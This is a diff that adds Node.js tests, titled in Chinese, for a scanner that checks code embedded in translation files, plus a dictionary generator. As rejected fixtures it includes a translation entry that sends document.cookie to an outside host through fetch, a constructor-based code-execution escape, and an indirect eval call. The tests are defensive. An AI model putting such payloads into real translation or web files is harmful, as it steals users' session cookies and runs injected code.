@@ -65,3 +65,33 @@ test("普通改动不误报；受保护路径照常标高", () => {
   r = scan(() => { fs.mkdirSync(path.join(repo, "scripts")); fs.writeFileSync(path.join(repo, "scripts/x.mjs"), "1\n"); });
   assert.equal(r.code, 1);
 });
+
+test("译文里的代码：合规的 @ 行算中，塞进别的代码算高；生成的 js 里不是字符串的值同样过白名单", () => {
+  const w = (rel, text) => { fs.mkdirSync(path.dirname(path.join(repo, rel)), { recursive: true }); fs.writeFileSync(path.join(repo, rel), text); };
+  let r = scan(() => w("i18n/lang-ja.txt", "1\t@(v) => `${v.n} 件`\n2\t@@at\n3\tふつう\n"));
+  assert.match(r.out, /译文里的代码（复数等）/);
+  assert.equal(r.code, 0);
+  r = scan(() => w("i18n/lang-ja.txt", "1\t@(v) => fetch(\"//x/\" + document.cookie)\n"));
+  assert.match(r.out, /译文里的代码不合规/);
+  assert.equal(r.code, 1);
+  r = scan(() => w("gateway/web/lang-ja.js",
+    'window.I18N_DICT = window.I18N_DICT || {};\nwindow.I18N_DICT["ja"] = {\n  "a": "x",\n  "b": (v) => v.constructor.constructor("alert(1)")(),\n};\n'));
+  assert.match(r.out, /译文里的代码不合规/);
+  assert.equal(r.code, 1);
+  r = scan(() => w("gateway/web/lang-ja.js", '  "a": "x",\nfetch("//x");\n'));
+  assert.match(r.out, /不是词条的行/);
+});
+
+test("mkdict：@ 行不合规就拒绝生成；现有的复数函数照常生成", () => {
+  const MK = path.resolve(path.dirname(SCRIPT), "../i18n/mkdict.mjs");
+  const d = fs.mkdtempSync(path.join(process.env.CCAPP_TMP, "mkdict-"));
+  fs.writeFileSync(path.join(d, "en.js"), '  "条":\n  "件":\n');
+  fs.writeFileSync(path.join(d, "ok.txt"), "1\t@(v) => `${v.n} item${v.n === 1 ? \"\" : \"s\"}`\n2\tx\n");
+  fs.writeFileSync(path.join(d, "bad.txt"), "1\t@(v) => (0, eval)(\"1\")\n2\tx\n");
+  let r = spawnSync(process.execPath, [MK, path.join(d, "ok.txt"), path.join(d, "en.js"), path.join(d, "ok.js"), "xx"], { encoding: "utf8" });
+  assert.equal(r.status, 0, r.stderr);
+  r = spawnSync(process.execPath, [MK, path.join(d, "bad.txt"), path.join(d, "en.js"), path.join(d, "bad.js"), "xx"], { encoding: "utf8" });
+  assert.notEqual(r.status, 0);
+  assert.match(r.stderr, /不合规/);
+  assert.ok(!fs.existsSync(path.join(d, "bad.js")));
+});
